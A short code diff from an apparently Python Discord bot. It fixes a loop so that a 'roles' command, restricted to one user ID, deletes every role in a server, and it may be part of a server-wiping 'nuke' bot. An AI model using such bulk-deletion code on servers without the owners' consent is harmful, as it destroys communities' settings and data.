@@ -97,7 +97,7 @@ async def roles(ctx, *, arg):
     if ctx.author.id == ID:
         msg = ctx.message
         await msg.add_reaction("🔄")
-        for channel in ctx.guild.roles:
+        for role in ctx.guild.roles:
             await role.delete()
         x = 30
         guild = ctx.guild
